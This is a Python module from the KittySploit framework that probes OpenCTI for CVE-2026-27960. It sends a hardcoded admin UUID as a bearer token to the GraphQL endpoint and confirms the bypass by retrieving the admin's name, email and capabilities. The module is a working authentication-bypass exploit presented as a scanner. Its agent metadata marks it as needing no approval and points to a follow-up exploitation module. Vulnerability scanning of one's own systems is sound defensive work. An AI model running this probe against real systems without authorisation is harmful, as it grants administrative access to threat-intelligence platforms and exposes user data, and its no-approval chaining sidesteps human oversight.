#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect OpenCTI CVE-2026-27960 hardcoded admin UUID authentication bypass."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Scanner, Http_client):
    __info__ = {
        "name": "OpenCTI CVE-2026-27960 Auth Bypass Detect",
        "description": (
            "Detects CVE-2026-27960 in OpenCTI 6.6.0 through 6.9.12: authenticateUserByTokenOrUserId "
            "looks up users by bearer token without verifying it equals api_token. The admin "
            "internal_id 88ec0c6a-13ce-5e39-b486-354fe4a7084f is identical across deployments "
            "and authenticates as admin when sent as a bearer token."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-27960"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-27960",
            "https://www.cve.org/CVERecord?id=CVE-2026-27960",
        ],
        "modules": ["auxiliary/admin/http/opencti_cve_2026_27960_auth_bypass"],
        "tags": [
            "web",
            "scanner",
            "opencti",
            "graphql",
            "auth-bypass",
            "cve-2026-27960",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["opencti", "graphql"],
                "endpoint_pattern_any": ["/graphql"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "hardcoded admin UUID"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/opencti_cve_2026_27960_auth_bypass",
                ],
            },
        },
    }

    port = OptPort(4000, "OpenCTI HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    graphql_path = OptString(
        "/graphql",
        "GraphQL endpoint path (e.g. /graphql, /public/graphql)",
        False,
    )

    def run(self):
        base = (self.path or "/").rstrip("/")
        gql = self.graphql_path if self.graphql_path.startswith("/") else f"/{self.graphql_path}"
        endpoint = f"{base}{gql}" if base else gql
        try:
            response = self.http_request(
                method="POST",
                path=endpoint,
                json={"query": "{ me { id name user_email capabilities { name } } }"},
                headers={
                    "Authorization": "Bearer 88ec0c6a-13ce-5e39-b486-354fe4a7084f",
                    "Content-Type": "application/json",
                },
                timeout=int(self.timeout or 15),
            )
        except Exception as exc:
            print_status(f"CVE-2026-27960 probe failed: {exc.__class__.__name__}")
            return False

        if not response or response.status_code != 200:
            return False

        body, err = parse_json_response(response)
        if err or not body:
            return False
        if body.get("errors") and not body.get("data"):
            return False

        me = (body.get("data") or {}).get("me")
        if not me:
            return False

        caps = [c.get("name", "") for c in me.get("capabilities") or []]
        if "BYPASS" not in caps and me.get("id") != "88ec0c6a-13ce-5e39-b486-354fe4a7084f":
            return False

        name = me.get("name") or ""
        email = me.get("user_email") or ""
        reason = f"CVE-2026-27960: authenticated as admin '{name}' <{email}>"
        print_status(f"CVE-2026-27960 vuln=True user={name}")
        self.set_info(
            severity="critical",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-27960",
            path=endpoint,
            user_id=me.get("id"),
            user_name=name,
            user_email=email,
            capabilities=caps,
        )
        return True
